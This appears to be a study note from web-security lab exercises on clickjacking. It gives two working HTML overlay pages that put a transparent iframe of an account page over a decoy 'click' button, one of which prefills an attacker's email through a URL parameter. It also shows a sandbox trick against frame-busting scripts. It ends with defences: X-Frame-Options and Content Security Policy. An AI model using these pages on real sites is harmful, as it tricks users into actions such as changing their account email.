## basic clickjacking attack

- Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. 
- An example of using the style tag and parameters

```js
<head> 
	<style> 
	iframe { 
		position:relative; 
		width:1280px; 
		height:1280px; 
		opacity:0.1; 
		z-index:2; 
	} 
	div { 
		position:absolute;
		top:530px;
		left:100px; 
	} 
	</style> 
</head> 
<body> 
	<div>click</div> 
	<iframe  src="https://0a25003f03cc927b80cae01600aa0007.web-security-academy.net/my-account"> </iframe> 
</body>
```

## Clickjacking with form input data prefilled from a URL parameter

```js
<head> 
	<style> 
	iframe { 
		position:relative; 
		width:1280px; 
		height:1280px; 
		opacity:0.8; 
		z-index:2; 
	} 
	div { 
		position:absolute;
		top:500px;
		left:100px; 
	} 
	</style> 
</head> 
<body> 
	<div>click me</div> 
	<iframe  src="https://random.com/my-account?email=hacker@evil-user.net"> </iframe> 
</body>
```

## Frame busting scripts

```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```

## Preventing clickjacking attacks

- The header provides the website owner with control over the use of iframes or objects so that inclusion of a web page within a frame can be prohibited with the `deny` directive:

```js
X-Frame-Options: deny
```

- Alternatively, framing can be restricted to the same origin as the website using the `sameorigin` directive

```js
X-Frame-Options: sameorigin
```

- or to a named website using the `allow-from` directive:

```js
X-Frame-Options: allow-from https://normal-website.com
```

- X-Frame-Options is not implemented consistently across browsers (the `allow-from` directive is not supported in Chrome version 76 or Safari 12 for example). However, when properly applied in conjunction with Content Security Policy as part of a multi-layer defense strategy it can provide effective protection against clickjacking attacks.

- Content Security Policy (CSP) is a detection and prevention mechanism that provides mitigation against attacks such as XSS and clickjacking. CSP is usually implemented in the web server as a return header of the form:

```js
Content-Security-Policy: policy
```

